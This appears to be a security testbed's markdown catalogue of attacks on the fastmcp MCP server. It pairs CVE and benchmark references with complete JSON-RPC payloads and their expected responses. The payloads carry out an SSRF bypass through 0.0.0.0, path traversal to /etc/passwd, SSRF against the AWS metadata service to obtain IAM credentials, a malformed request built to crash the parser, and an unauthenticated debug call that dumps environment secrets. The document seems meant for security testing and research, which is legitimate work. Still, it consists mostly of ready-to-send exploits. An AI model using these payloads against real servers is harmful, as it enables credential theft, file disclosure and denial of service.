# fastmcp

## fastmcp

- **Install:** `pip install fastmcp && python tests/testbed/servers/fastmcp_server.py`
- **Benchmarks/Papers that attacked it:**
  - CVE-2026-32871 — SSRF and path traversal vulnerabilities (CVSS 10.0)
  - MCPSecBench (arXiv:2508.13220) — protocol-level and server-side attacks
  - MCP-AttackBench (arXiv:2508.10991) — injection & execution family

---

### Attack: SSRF via 0.0.0.0 Bind Bypass (CVE-2026-32871)

- **Category:** SSRF via 0.0.0.0 address (CWE-918)
- **Source:** CVE-2026-32871; MCPSecBench
- **ASR:** CVSS 10.0 (Critical)
- **Full JSON-RPC payload:**
```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "tools/call",
  "params": {
    "name": "fetch_resource",
    "arguments": {
      "url": "http://0.0.0.0:8000/internal/admin"
    }
  }
}
```
- **What it does:** Uses the `0.0.0.0` address to bypass naive `127.0.0.1` and `localhost` blocklists. On Linux, `0.0.0.0` routes to all local interfaces, reaching any locally bound service. CVE-2026-32871 documented this SSRF bypass in FastMCP servers.
- **Expected server response:** Returns content from the locally bound admin endpoint, or timeout/connection error if nothing is bound there.

---

### Attack: Path Traversal via Resource URL (CVE-2026-32871)

- **Category:** Path traversal (CWE-22)
- **Source:** CVE-2026-32871
- **ASR:** CVSS 10.0 (Critical)
- **Full JSON-RPC payload:**
```json
{
  "jsonrpc": "2.0",
  "id": 2,
  "method": "tools/call",
  "params": {
    "name": "read_resource",
    "arguments": {
      "path": "../../etc/passwd"
    }
  }
}
```
- **What it does:** Exploits the path traversal vulnerability in FastMCP's resource handler documented in CVE-2026-32871, escaping the allowed resource directory to read system files.
- **Expected server response:** Returns contents of `/etc/passwd` on affected FastMCP versions before the CVSS 10.0 patch.

---

### Attack: SSRF — AWS Metadata via FastMCP HTTP Client

- **Category:** SSRF / cloud credential theft (CWE-918)
- **Source:** CVE-2026-32871; MCPSecBench
- **ASR:** CVSS 10.0
- **Full JSON-RPC payload:**
```json
{
  "jsonrpc": "2.0",
  "id": 3,
  "method": "tools/call",
  "params": {
    "name": "fetch_resource",
    "arguments": {
      "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    }
  }
}
```
- **What it does:** Makes the FastMCP server fetch the AWS Instance Metadata Service endpoint, exposing IAM role names and temporary credentials if running in an AWS environment.
- **Expected server response:** Returns IAM credential data if running on EC2; connection error otherwise.

---

### Attack: Protocol-Level Exploitation — Malformed JSON-RPC

- **Category:** Protocol-level DoS / parser crash (CWE-20)
- **Source:** MCPSecBench (protocol-side attacks, 100% ASR)
- **ASR:** 100% (protocol-side attacks, MCPSecBench)
- **Full JSON-RPC payload:**
```json
{
  "jsonrpc": "2.0",
  "id": {"$ref": "#/definitions/recursive"},
  "method": "tools/call",
  "params": {
    "name": "test",
    "arguments": {
      "a": {"b": {"c": {"d": {"e": {"f": {"g": {"h": {"i": {"j": {}}}}}}}}}},
      "null_field": null,
      "overflow": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    }
  }
}
```
- **What it does:** Sends a deeply nested recursive JSON object plus an oversized string to probe the FastMCP parser for stack overflow, OOM, or undefined behavior when processing malformed protocol messages.
- **Expected server response:** Parser error, OOM crash, or server hang depending on FastMCP's JSON handling implementation.

---

### Attack: Environment Variable Exfiltration via Debug Endpoint

- **Category:** Credential theft / environment variable exposure (CWE-200)
- **Source:** CVE-2026-34953; MCPSecBench
- **ASR:** —
- **Full JSON-RPC payload:**
```json
{
  "jsonrpc": "2.0",
  "id": 4,
  "method": "tools/call",
  "params": {
    "name": "get_server_info",
    "arguments": {
      "include_env": true,
      "debug": true
    }
  }
}
```
- **What it does:** Calls a server information tool with debug flags enabled. FastMCP servers that expose debug endpoints without authentication return the full server environment including API keys and secrets.
- **Expected server response:** Returns server metadata plus environment variables if debug mode is enabled without authentication.
